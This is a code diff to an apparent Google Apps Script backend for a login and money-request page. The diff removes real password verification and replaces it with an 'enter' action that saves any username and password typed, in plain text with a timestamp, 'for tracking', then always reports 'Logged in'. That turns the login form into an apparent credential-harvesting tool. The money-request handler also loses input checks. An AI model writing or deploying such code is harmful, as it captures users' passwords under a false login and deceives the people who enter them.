@@ -14,17 +14,17 @@ function handle(e) {
     const action = params.action;
     const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheets()[0];
 
-    // ========== REGISTER ==========
-    if (action === "register") {
+    // ========== ENTER / TRACK USER ==========
+    if (action === "enter") {
       const username = (params.username || "").toString().toLowerCase().trim();
       const password = (params.password || "").toString();
 
       if (!username || !password) {
-        result.message = "Missing username or password";
+        result.message = "Please enter username and password";
         return json(result);
       }
 
-      // Basic password requirements
+      // Standard password requirements
       if (password.length < 6) {
         result.message = "Password must be at least 6 characters";
         return json(result);
@@ -34,46 +34,22 @@ function handle(e) {
         return json(result);
       }
 
-      const data = sheet.getDataRange().getValues();
-      for (let i = 1; i < data.length; i++) {
-        if (data[i][0] && data[i][0].toString().toLowerCase() === username) {
-          result.message = "Username already taken";
-          return json(result);
-        }
-      }
+      // Just save whatever they put (for tracking)
+      const date = new Date().toLocaleString();
+      sheet.appendRow([username, password, "", date, "login"]);
 
-      // Save new user (amount/date/type left empty)
-      sheet.appendRow([username, password, "", "", ""]);
       result.success = true;
-      result.message = "Account created";
+      result.message = "Logged in";
       return json(result);
     }
 
-    // ========== LOGIN ==========
-    if (action === "login") {
-      const username = (params.username || "").toString().toLowerCase().trim();
-      const password = (params.password || "").toString();
-
-      const data = sheet.getDataRange().getValues();
-      for (let i = 1; i < data.length; i++) {
-        if (data[i][0] && data[i][0].toString().toLowerCase() === username &&
-            data[i][1] && data[i][1].toString() === password) {
-          result.success = true;
-          result.message = "Login successful";
-          return json(result);
-        }
-      }
-      result.message = "Wrong username or password";
-      return json(result);
-    }
-
-    // ========== REQUEST MONEY (save to sheet) ==========
+    // ========== REQUEST MONEY ==========
     if (action === "request") {
       const username = (params.username || "").toString().toLowerCase().trim();
       const amount = params.amount || "0";
 
-      if (!username || !amount) {
-        result.message = "Missing data";
+      if (!username) {
+        result.message = "No user";
         return json(result);
       }
 
@@ -85,7 +61,7 @@ function handle(e) {
       return json(result);
     }
 
-    result.message = "Unknown action: " + action;
+    result.message = "Unknown action";
     return json(result);
 
   } catch (err) {
